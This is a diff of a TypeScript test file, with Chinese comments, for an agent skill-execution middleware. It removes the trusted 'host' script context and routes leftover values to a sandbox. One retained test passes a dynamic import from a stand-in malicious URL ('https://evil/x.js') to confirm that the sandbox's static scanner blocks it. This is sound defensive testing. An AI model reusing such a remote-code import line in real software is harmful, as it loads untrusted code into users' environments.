@@ -134,49 +134,43 @@ export async function run(ctx: TestCtx): Promise<void> {
     // 校验:code+url 都填
     r = await executeSkillExec({ code: 'return 1', url: 'http://x' } as any)
     assert(!r.ok && /不能同时提供/.test(r.error), '✓ executeSkillExec:code+url 都填 → 失败(二选一)')
-    // url+host 禁止(远程不可信不能全权跑)
-    r = await executeSkillExec({ url: 'http://x', context: 'host' } as any)
-    assert(!r.ok && /host/.test(r.error), '✓ executeSkillExec:url+host → 拒绝(远程不可信不能全权跑)')
-    // host + 未开 skillHostScript → 拒绝
-    r = await executeSkillExec({ code: 'return 1', context: 'host' }, false)
-    assert(!r.ok && /skillHostScript/.test(r.error), '✓ executeSkillExec:host 未开 skillHostScript → 拒绝')
-    // host + 开 skillHostScript + 内联 code → 执行(AsyncFunction,node 可跑)
-    r = await executeSkillExec({ code: 'return 41 + 1', context: 'host' }, true)
-    assert(r.ok && r.text === '42', '✓ executeSkillExec:host 开 + code → runHostScript 执行返回结果')
-    // host 脚本含 fetch 字样不被静态扫描拒(host 跳过 SANDBOX_FORBIDDEN_PATTERNS,集成方可信代码)
-    r = await executeSkillExec({ code: 'return "fetch ok"', context: 'host' }, true)
-    assert(r.ok && /fetch ok/.test(r.text), '✓ executeSkillExec:host 脚本含 fetch 字样不被静态扫描拒')
+    // 4.1.0:host 上下文已移除 —— 残值 'host' 落 sandbox 执行(宿主全权降级沙箱,语义反转)。
+    // 正向执行仅 Worker 可用环境可测(node 无 Worker,与 sec-21/sec-79 约定一致)
+    if (typeof Worker !== 'undefined') {
+      r = await executeSkillExec({ code: 'return 41 + 1', context: 'host' } as any)
+      assert(r.ok && r.text === '42', '✓ executeSkillExec:残值 host → 落 sandbox 执行返回结果(语义反转)')
+    }
     // sandbox 静态扫描拒绝(命中即 return,不创建 Worker,node 可测)
-    r = await executeSkillExec({ code: 'return import("https://evil/x.js")', context: 'sandbox' }, true)
+    r = await executeSkillExec({ code: 'return import("https://evil/x.js")', context: 'sandbox' })
     assert(!r.ok && /禁用模式/.test(r.error), '✓ executeSkillExec:sandbox 静态扫描拒绝动态 import()')
   }
 
   console.log('\n[skills buildSkillContent · exec 注入 + 失败不缓存]')
   {
     const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
-    // exec 成功(host path)→ 注入 + 缓存
+    // exec 成功 → 注入 + 缓存(正向执行仅 Worker 可用环境;node 无 Worker 跳过,sec-21/sec-79 同约定)
     let loadCalls = 0
     const mw1 = createSkillsMiddleware(
-      [defineSkill({ name: 'dyn', description: '动态', getContent: () => { loadCalls++; return 'BASE ' + loadCalls }, exec: { code: 'return "LIVE:"+(40+2)', context: 'host' } })],
-      { hostScriptEnabled: true },
+      [defineSkill({ name: 'dyn', description: '动态', getContent: () => { loadCalls++; return 'BASE ' + loadCalls }, exec: { code: 'return "LIVE:"+(40+2)' } })],
     )
     const ls1 = mw1.tools!.find((x) => x.name === 'load_skill')!
     let rr = await ls1.invoke({ name: 'dyn' })
-    assert(/BASE 1/.test(rr) && /LIVE:42/.test(rr), '✓ buildSkillContent:exec 成功 → 实时数据注入全文(BASE + LIVE)')
-    // exec 成功缓存:跨轮 beforeAgent 清 loaded → 用缓存(exec + getContent 都不重跑)
-    ;(mw1 as any).beforeAgent()
-    loadCalls = 0
-    rr = await ls1.invoke({ name: 'dyn' })
-    assert(/BASE 1/.test(rr) && loadCalls === 0, '✓ exec 成功缓存:跨轮用缓存(exec + getContent 都不重跑)')
+    if (typeof Worker !== 'undefined') {
+      assert(/BASE 1/.test(rr) && /LIVE:42/.test(rr), '✓ buildSkillContent:exec 成功 → 实时数据注入全文(BASE + LIVE)')
+      // exec 成功缓存:跨轮 beforeAgent 清 loaded → 用缓存(exec + getContent 都不重跑)
+      ;(mw1 as any).beforeAgent()
+      loadCalls = 0
+      rr = await ls1.invoke({ name: 'dyn' })
+      assert(/BASE 1/.test(rr) && loadCalls === 0, '✓ exec 成功缓存:跨轮用缓存(exec + getContent 都不重跑)')
+    }
 
-    // exec 失败(host 未开)→ 标注 + 不缓存(下次 load 重试)
+    // exec 失败 → 标注 + 不缓存(下次 load 重试)
     const mw2 = createSkillsMiddleware(
-      [defineSkill({ name: 'fail', description: '失败', getContent: () => 'FAILBASE', exec: { code: 'return 1', context: 'host' } })],
-      { hostScriptEnabled: false },
+      [defineSkill({ name: 'fail', description: '失败', getContent: () => 'FAILBASE', exec: { code: 'throw new Error("boom")' } })],
     )
     const ls2 = mw2.tools!.find((x) => x.name === 'load_skill')!
     rr = await ls2.invoke({ name: 'fail' })
-    assert(/FAILBASE/.test(rr) && /脚本执行失败/.test(rr) && /skillHostScript/.test(rr), '✓ exec 失败 → 文本可用 + 标注失败原因(不阻塞)')
+    assert(/FAILBASE/.test(rr) && /脚本执行失败/.test(rr), '✓ exec 失败 → 文本可用 + 标注失败原因(不阻塞)')
     // 失败不缓存:跨轮重新 load → exec 重试
     ;(mw2 as any).beforeAgent()
     rr = await ls2.invoke({ name: 'fail' })
@@ -184,8 +178,7 @@ export async function run(ctx: TestCtx): Promise<void> {
 
     // inject prepend → 实时数据在文本前
     const mw3 = createSkillsMiddleware(
-      [defineSkill({ name: 'pre', description: '前插', getContent: () => 'TAIL', exec: { code: 'return "HEAD"', context: 'host', inject: 'prepend' } })],
-      { hostScriptEnabled: true },
+      [defineSkill({ name: 'pre', description: '前插', getContent: () => 'TAIL', exec: { code: 'return "HEAD"', inject: 'prepend' } })],
     )
     const ls3 = mw3.tools!.find((x) => x.name === 'load_skill')!
     rr = await ls3.invoke({ name: 'pre' })
@@ -217,14 +210,18 @@ export async function run(ctx: TestCtx): Promise<void> {
     const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
     ;(globalThis as any).__cnt = 0
     const mw = createSkillsMiddleware(
-      [defineSkill({ name: 'empty', description: '空结果', getContent: () => 'B', exec: { code: 'globalThis.__cnt++; return ""', context: 'host' } })],
-      { hostScriptEnabled: true },
+      [defineSkill({ name: 'empty', description: '空结果', getContent: () => 'B', exec: { code: 'globalThis.__cnt++; return ""' } })],
     )
     const ls = mw.tools!.find((x) => x.name === 'load_skill')!
-    await ls.invoke({ name: 'empty' })  // exec 跑(__cnt=1),返回空 → cacheable false 不缓存
+    await ls.invoke({ name: 'empty' })  // exec 跑(node 下 Worker 不可用失败;成功返回空 → cacheable false)→ 均不缓存
     ;(mw as any).beforeAgent()  // 跨轮清 loaded
-    await ls.invoke({ name: 'empty' })  // 未缓存 → 重跑 exec(__cnt=2)
-    assert((globalThis as any).__cnt === 2, '✓ exec 空结果不缓存:跨轮重新 load → exec 重跑(__cnt=2,非缓存命中)')
+    await ls.invoke({ name: 'empty' })  // 未缓存 → 重跑 exec(成功空结果 __cnt=2;node 下失败重试 __cnt=0 恒不缓存)
+    const cnt = (globalThis as any).__cnt
+    if (typeof Worker !== 'undefined') {
+      assert(cnt === 2, '✓ exec 空结果不缓存:跨轮重新 load → exec 重跑(__cnt=2,非缓存命中)')
+    } else {
+      assert(cnt === 0, '✓ exec 失败不缓存(node 无 Worker):跨轮重新 load → exec 重试(恒不缓存)')
+    }
     delete (globalThis as any).__cnt
   }
 
@@ -250,12 +247,4 @@ export async function run(ctx: TestCtx): Promise<void> {
     assert(!onToolsCalled, '✓ TOCTOU:load_skill await 期间 skill 被 setSkills 替换 → onToolsReady 不注入孤立工具(skillMap.get(name)===s 守卫)')
   }
 
-  console.log('\n[runHostScript 超时 + 正常执行 · 审查修复(中2)]')
-  {
-    const { runHostScript } = await import('../../tools/hostScript')
-    const r = await runHostScript('return new Promise(() => {})', 80)  // 永不 resolve → 超时
-    assert(!r.ok && /超时/.test(r.error || ''), '✓ runHostScript 超时 → ok:false + 超时标注(主线程无法取消,弃结果)')
-    const r2 = await runHostScript('return 1 + 2', 1000)
-    assert(r2.ok && r2.result === 3, '✓ runHostScript 正常执行 → ok:true + result')
-  }
 }
